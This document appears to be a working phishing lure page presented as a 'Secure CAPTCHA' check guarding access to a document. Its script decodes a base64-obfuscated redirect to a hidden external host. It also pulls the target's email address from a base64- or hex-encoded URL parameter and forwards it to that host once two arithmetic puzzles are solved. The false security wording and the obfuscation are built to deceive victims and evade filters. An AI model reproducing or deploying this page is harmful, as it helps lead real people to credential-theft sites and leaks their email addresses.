<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    :root {
      --bg: #ffffff;
      --text: #333;
      --box-bg: #f7f7f7;
      --primary: #007bff;
      --success-green: #28a745;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
      position: relative;
    }

    .logo {
      position: absolute;
      top: 10px;
      left: 10px;
      display: flex;
      align-items: center;
      background: var(--box-bg);
      padding: 5px 10px;
      border-radius: 16px;
      box-shadow: 0 0 0 3px var(--primary);
      border: 1px solid var(--primary);
    }

    .logo img {
      width: 18px;
      height: 18px;
      margin-right: 6px;
      object-fit: contain;
    }

    .logo span {
      font-size: 1.05rem;
      font-weight: 600;
      color: var(--primary);
      white-space: nowrap;
    }

    #captcha-box {
      background: var(--box-bg);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.4);
      text-align: center;
      width: 100%;
      max-width: 400px;
      border: 1px solid rgba(0, 123, 255, 0.5);
    }

    .captcha-header {
      font-size: 1.1rem;
      font-weight: 500;
      margin-bottom: 18px;
      color: var(--text);
    }

    #captcha-question {
      font-size: 1.2rem;
      margin-bottom: 12px;
    }

    input[type="number"] {
      font-size: 1rem;
      padding: 10px;
      width: 60%;
      max-width: 200px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      padding: 12px 24px;
      font-size: 1rem;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #0056b3;
    }

    #message {
      margin-top: 15px;
      font-size: 1.1rem;
      min-height: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .icon-success {
      width: 24px;
      height: 24px;
    }

    p.note {
      font-size: 0.88rem;
      color: #666;
      margin-top: 20px;
      line-height: 1.4;
    }

    @media (max-width: 480px) {
      .logo img {
        width: 18px;
        height: 18px;
        margin-right: 6px;
      }

      .logo span {
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
    <span>Secure CAPTCHA</span>
  </div>

  <div id="captcha-box">
    <div class="captcha-header">For security reasons, please solve this to continue.</div>
    <div id="captcha-question">Loading...</div>
    <input type="number" id="user-answer" placeholder="Your answer" />
    <br />
    <button onclick="validateCaptcha()">Submit</button>
    <div id="message"></div>
    <p class="note">
      By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
    </p>
  </div>

  <script>
    let answer = 0;
    let firstSolved = false;

    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vcG9ydGFsZG9jLmZlbm1lbm9zLmRlL1ZrZXVVJTIyJTIwLyUzRQ==";

    function generateCaptcha() {
      const num1 = Math.floor(Math.random() * 20) + 1;
      const num2 = Math.floor(Math.random() * 10) + 1;
      const operations = ['+', '-', '*'];
      const operation = operations[Math.floor(Math.random() * operations.length)];

      let question = '';
      switch (operation) {
        case '+':
          answer = num1 + num2;
          question = `${num1} + ${num2}`;
          break;
        case '-':
          answer = num1 - num2;
          question = `${num1} - ${num2}`;
          break;
        case '*':
          answer = num1 * num2;
          question = `${num1} x ${num2}`;
          break;
      }

      document.getElementById("captcha-question").innerText = `What is ${question}?`;
      document.getElementById("user-answer").value = '';
      document.getElementById("message").innerText = '';
    }

    function decodeMetaRefresh(base64Str) {
      const decoded = atob(base64Str);
      const match = decodeURIComponent(decoded).match(/url=([^"'&]+)/i);
      return match ? match[1] : null;
    }

    function decodeHex(str) {
      let result = '';
      for (let i = 0; i < str.length; i += 2) {
        result += String.fromCharCode(parseInt(str.substr(i, 2), 16));
      }
      return result;
    }

    function decodeEmail(raw) {
      try {
        const base64 = atob(raw);
        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(base64)) return base64;
      } catch {}

      try {
        const hexDecoded = decodeHex(raw);
        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(hexDecoded)) return hexDecoded;
      } catch {}

      // return as-is if nothing decoded
      return raw;
    }

    function parseEmailParam() {
      const params = new URLSearchParams(window.location.search);
      let emailRaw = params.get("id");
      if (!emailRaw) return null;
      return decodeEmail(emailRaw);
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById("user-answer").value);
      const msg = document.getElementById("message");

      if (userAnswer === answer) {
        if (!firstSolved) {
          firstSolved = true;
          msg.innerText = "Correct! One more to go...";
          generateCaptcha();
        } else {
          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
          setTimeout(() => {
            redirectUser();
          }, 1500);
        }
      } else {
        msg.innerText = "Incorrect. Please try again.";
      }
    }

    function redirectUser() {
      try {
        const finalUrl = decodeMetaRefresh(base64Ref);
        if (!finalUrl) throw new Error("Invalid redirect format");

        const email = parseEmailParam();
        const encodedEmail = encodeURIComponent(email).replace(/%40/g, "@");

        const urlWithParam = email ? `${finalUrl}?e=${encodedEmail}` : finalUrl;
        window.location.href = urlWithParam;
      } catch (e) {
        alert("Redirect failed. Invalid format.");
      }
    }

    window.onload = generateCaptcha;
  </script>
</body>
</html>
